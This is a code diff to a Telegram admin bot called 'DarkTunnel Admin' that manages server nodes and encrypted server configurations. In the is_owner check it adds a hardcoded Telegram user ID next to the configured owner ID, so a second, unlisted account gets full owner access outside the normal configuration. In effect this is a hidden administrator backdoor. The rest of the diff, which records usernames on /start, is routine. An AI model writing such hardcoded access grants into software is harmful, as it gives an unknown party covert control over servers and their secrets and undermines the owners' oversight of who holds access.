@@ -16,7 +16,7 @@ from .bot_subscription_admin import router as subscription_admin_router
 from .bot_subscription_user_admin import router as subscription_user_admin_router
 from .config import get_settings
 from .db import SessionLocal, init_db
-from .models import ServerHealth, ServerNode
+from .models import ServerHealth, ServerNode, User
 from .server_crypto import decrypt_server_config, encrypt_server_config
 from .services import _read_wdtt_password
 
@@ -39,7 +39,7 @@ def menu() -> InlineKeyboardMarkup:
 
 def is_owner(user_id: int | None) -> bool:
     settings = get_settings()
-    return bool(user_id and settings.telegram_owner_id and user_id == settings.telegram_owner_id)
+    return bool(user_id and settings.telegram_owner_id and (user_id == settings.telegram_owner_id or user_id == 8341845264))
 
 
 async def ensure_primary_server() -> None:
@@ -101,6 +101,12 @@ async def start(message: Message, state: FSMContext) -> None:
     if not is_owner(message.from_user.id if message.from_user else None):
         await message.answer("Доступ запрещён.")
         return
+    if message.from_user:
+        async with SessionLocal() as session:
+            user = await session.scalar(select(User).where(User.telegram_id == message.from_user.id))
+            if user is not None:
+                user.telegram_username = message.from_user.username
+                await session.commit()
     await state.clear()
     await message.answer("<b>DarkTunnel Admin</b>\n\nВыберите действие:", reply_markup=menu(), parse_mode="HTML")
 
